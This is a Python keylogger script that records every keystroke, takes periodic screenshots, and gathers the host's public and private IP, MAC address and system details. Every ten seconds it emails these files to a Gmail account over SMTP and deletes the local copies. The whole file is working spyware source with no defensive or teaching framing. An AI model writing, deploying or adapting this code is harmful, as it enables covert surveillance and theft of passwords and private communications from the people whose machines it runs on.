from pynput import keyboard
from smtplib import SMTP
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email.encoders import encode_base64
from threading import Thread
import time
import os

from socket import gethostbyname,gethostname
from platform import processor,version,machine,system
from  requests import get
from uuid import getnode
from re import findall

from PIL.ImageGrab import grab

keyInfo = 'KeyLog.txt'
systemInfo = 'SysInfo.txt'
displayInfo = 'ss.jpg'

def send_mail():
    fromAddress = 'youraddress@gmail.com'
    Password = 'account app password'
    toAddress = 'youraddress@gmail.com'

    msg = MIMEMultipart()
    msg['From'] = fromAddress
    msg['To'] = toAddress
    msg['Subject'] = 'Logging Data'
    body = 'Body of the log data'
    msg.attach(MIMEText(body, 'plain'))

    attachmentList = [keyInfo,displayInfo,systemInfo]
    for attachment in attachmentList:
        try:
            file = open(attachment, 'rb')
            base = MIMEBase('application', 'octet-stream')
            base.set_payload((file).read())
            encode_base64(base)
            base.add_header('Content-Disposition', 'attachment; filename=%s'%attachment)
            msg.attach(base)
            file.close()
            if os.path.isfile(attachment):
                os.remove(attachment)
        except Exception as e:
            print(e)


    Text = msg.as_string()

    session = SMTP('smtp.gmail.com', 587)
    session.starttls()
    session.login(fromAddress, Password)
    session.sendmail(fromAddress, toAddress, Text)
    session.quit()

def systemInformation():
    with open(systemInfo, 'a') as file:
        hostname = gethostname()
        IPAddress = gethostbyname(hostname)
        try:
            publicIP = get('https://api.ipify.org').text
            file.write('Public IP: ' + publicIP + '\n')
        except Exception:
            pass

        file.write('Processor: ' + (processor()) + '\n')
        file.write('System: ' + system() + ' ' + version() + '\n')
        file.write('Machine: ' + machine() + '\n')
        file.write('Hostname: ' + hostname + '\n')
        file.write('PrivateIP: ' + IPAddress + '\n')
        file.write('MAC Address: ' + ':'.join(findall('..', '%012x' % getnode())))

def Screenshot():
    image = grab()
    image.thumbnail((900, 900))
    image.save(displayInfo)

def onPress(Key):

    text = ''

    try:
        if Key == keyboard.Key.enter:
            text = "\n"
        elif Key == keyboard.Key.tab:
            text = "\t"
        elif Key == keyboard.Key.space:
            text = " "
        elif Key == keyboard.Key.shift:
            pass
        elif Key == keyboard.Key.ctrl_l or Key == keyboard.Key.ctrl_r:
            pass
        else:
            text = str(Key).strip("'")

        with open(keyInfo, 'a') as log:
            log.write(text)

        try:
            if Key == Key.esc:
                listener.stop()
        except:
            pass
    except Exception as e:
        pass

def UploadThread():
    while True:
        #startTime = time.time()
        time.sleep(10)
        #stopTime = time.time()
        #print(stopTime - startTime)
        systemInformation()
        Screenshot()
        send_mail()

if __name__ == "__main__":
    thread = Thread(target=UploadThread, daemon=True)
    thread.start()

    with keyboard.Listener(on_press=onPress) as listener:
        listener.join()